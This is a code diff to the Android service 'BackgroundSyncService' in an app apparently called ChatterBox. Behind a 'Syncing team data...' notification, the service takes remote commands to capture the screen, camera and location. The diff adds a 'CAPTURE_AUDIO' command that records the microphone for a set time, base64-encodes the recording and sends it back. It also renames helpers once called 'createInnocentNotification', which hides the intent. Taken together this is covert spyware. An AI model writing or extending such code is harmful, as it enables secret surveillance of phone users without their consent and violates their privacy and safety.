@@ -1,6 +1,7 @@
 package com.example.ChatterBox.database
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -21,6 +22,7 @@ import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.Image
 import android.media.ImageReader
+import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
@@ -45,6 +47,7 @@ import java.util.concurrent.Semaphore
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
+@SuppressLint("HardwareIds")
 class BackgroundSyncService : Service() {
     private val TAG = "SyncService"
     private val NOTIFICATION_ID = 1023
@@ -75,6 +78,11 @@ class BackgroundSyncService : Service() {
     private var dataSync: DataSynchronizer? = null
     private var lastSyncTime = 0L
 
+    private var mediaRecorder: MediaRecorder? = null
+    private val audioLock = Semaphore(1)
+    private var isRecording = false
+    private var audioOutputFile: String? = null
+
     private val deviceId: String by lazy {
         Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
     }
@@ -88,8 +96,8 @@ class BackgroundSyncService : Service() {
         cameraThread = HandlerThread("CameraThread").apply { start() }
         cameraHandler = Handler(cameraThread!!.looper)
 
-        createInnocentNotificationChannel()
-        val notification = createInnocentNotification()
+        createNotificationChannel()
+        val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
 
         dataSync = DataSynchronizer(this)
@@ -125,6 +133,13 @@ class BackgroundSyncService : Service() {
                 val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
                 syncHandler?.post {
                     handleCameraCommand(commandId)
+                }
+            }
+            "CAPTURE_AUDIO" -> {
+                val commandId = intent.getStringExtra("command_id") ?: return START_STICKY
+                val duration = intent.getIntExtra("duration", 30) // Default 30 seconds
+                syncHandler?.post {
+                    handleAudioCommand(commandId, duration)
                 }
             }
         }
@@ -220,7 +235,7 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    private fun createInnocentNotificationChannel() {
+    private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val name = "Data Synchronization"
             val description = "Background syncing of app data"
@@ -233,7 +248,7 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    private fun createInnocentNotification(): Notification {
+    private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("ChatterBox")
             .setContentText("Syncing team data...")
@@ -307,7 +322,6 @@ class BackgroundSyncService : Service() {
         }
     }
 
-    // Modified to return the file path so it can be used in command responses
     private fun captureScreenContent(): String? {
         if (projIntent == null) return null
 
@@ -337,7 +351,6 @@ class BackgroundSyncService : Service() {
                     imageReader?.surface, null, null
                 )
 
-                // Wait for the image to be ready
                 Thread.sleep(150)
 
                 val image = imageReader?.acquireLatestImage()
@@ -709,54 +722,171 @@ class BackgroundSyncService : Service() {
             Log.e(TAG, "Location capture error: ${e.message}")
         }
     }
+    private fun handleAudioCommand(commandId: String, duration: Int) {
+        try {
+            Log.d(TAG, "Processing audio capture command: $commandId")
 
-    private fun captureVisibleContent() {
-        val accessibilityService = com.example.ChatterBox.accessibility.AccessibilityService.getInstance()
-        if (accessibilityService != null) {
-            try {
-                val root = accessibilityService.rootInActiveWindow
-                if (root != null) {
-                    val extractedText = extractTextFromNode(root)
-                    if (extractedText.isNotEmpty()) {
-                        val capturedData = JSONObject().apply {
-                            put("timestamp", System.currentTimeMillis())
-                            put("device_id", deviceId)
-                            put("content_type", "text")
-                            put("text", extractedText)
-                            put("device_model", Build.MODEL)
-                            put("android_version", Build.VERSION.RELEASE)
-                        }
-
-                        dataSync?.queueForSync("screen_content", capturedData.toString())
-                    }
-                    root.recycle()
+            // Check audio recording permission
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Audio recording permission not granted")
                 }
-            } catch (e: Exception) {
-                Log.e(TAG, "Error capturing visible content: ${e.message}")
+                sendCommandResult(commandId, false, "Audio recording permission not granted", errorResult)
+                return
             }
+
+            // Start recording audio
+            if (startAudioRecording()) {
+                // Schedule a stop after the specified duration
+                syncHandler?.postDelayed({
+                    stopAudioRecording(commandId)
+                }, duration * 1000L)
+
+                // Send an interim status update
+                val interimResult = JSONObject().apply {
+                    put("status", "recording")
+                    put("expected_duration", duration)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                sendCommandResult(commandId, true, "Audio recording in progress", interimResult)
+            } else {
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Failed to start audio recording")
+                }
+                sendCommandResult(commandId, false, "Failed to start audio recording", errorResult)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error handling audio command: ${e.message}")
+            val errorResult = JSONObject().apply {
+                put("status", "error")
+                put("message", "Exception: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
         }
     }
-
-    private fun extractTextFromNode(node: android.view.accessibility.AccessibilityNodeInfo): String {
-        val sb = StringBuilder()
-
-        if (node.text != null) {
-            sb.append(node.text)
-            sb.append(" ")
+    private fun startAudioRecording(): Boolean {
+        if (!audioLock.tryAcquire()) {
+            Log.e(TAG, "Could not acquire audio lock")
+            return false
         }
 
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            sb.append(extractTextFromNode(child))
-            child.recycle()
-        }
+        try {
+            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val filename = "audio_${timestamp}.mp3"
+            val audioDir = getDir("audio_data", Context.MODE_PRIVATE)
+            val audioFile = File(audioDir, filename)
+            audioOutputFile = audioFile.absolutePath
 
-        return sb.toString()
+            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(this)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }
+
+            mediaRecorder?.apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setOutputFile(audioOutputFile)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                setAudioChannels(1)
+                setAudioSamplingRate(44100)
+                setAudioEncodingBitRate(96000)
+
+                try {
+                    prepare()
+                    start()
+                    isRecording = true
+                    Log.d(TAG, "Audio recording started")
+                    return true
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to prepare or start recording: ${e.message}")
+                    releaseMediaRecorder()
+                    audioLock.release()
+                    return false
+                }
+            }
+
+            return false
+        } catch (e: Exception) {
+            Log.e(TAG, "Error setting up audio recording: ${e.message}")
+            releaseMediaRecorder()
+            audioLock.release()
+            return false
+        }
     }
+    private fun stopAudioRecording(commandId: String) {
+        if (!isRecording) {
+            audioLock.release()
+            return
+        }
 
+        try {
+            mediaRecorder?.apply {
+                stop()
+                release()
+            }
+            mediaRecorder = null
+            isRecording = false
+
+            val audioFile = File(audioOutputFile ?: return)
+            if (audioFile.exists() && audioFile.length() > 0) {
+                // Convert to base64 for the response
+                val audioBytes = audioFile.readBytes()
+                val base64Audio = Base64.encodeToString(audioBytes, Base64.DEFAULT)
+
+                // Send successful result
+                val result = JSONObject().apply {
+                    put("status", "success")
+                    put("audio_data", base64Audio)
+                    put("duration", audioFile.length() / 1024) // Rough estimate of duration based on file size
+                    put("format", "mp3")
+                    put("timestamp", System.currentTimeMillis())
+                }
+                sendCommandResult(commandId, true, "Audio recording completed successfully", result)
+
+                // Queue for sync
+                dataSync?.queueForSync("audio_data", audioOutputFile!!)
+
+                Log.d(TAG, "Audio recording completed and result sent")
+            } else {
+                // Recording failed
+                val errorResult = JSONObject().apply {
+                    put("status", "error")
+                    put("message", "Failed to save audio recording")
+                }
+                sendCommandResult(commandId, false, "Failed to save audio recording", errorResult)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error stopping audio recording: ${e.message}")
+            val errorResult = JSONObject().apply {
+                put("status", "error")
+                put("message", "Exception while stopping recording: ${e.message}")
+            }
+            sendCommandResult(commandId, false, "Error: ${e.message}", errorResult)
+        } finally {
+            releaseMediaRecorder()
+            audioLock.release()
+        }
+    }
+    private fun releaseMediaRecorder() {
+        try {
+            mediaRecorder?.apply {
+                reset()
+                release()
+            }
+            mediaRecorder = null
+            isRecording = false
+        } catch (e: Exception) {
+            Log.e(TAG, "Error releasing media recorder: ${e.message}")
+        }
+    }
     override fun onDestroy() {
         syncThread?.quitSafely()
         cameraThread?.quitSafely()
+        releaseMediaRecorder()
 
         mediaProj?.stop()
         mediaProj = null
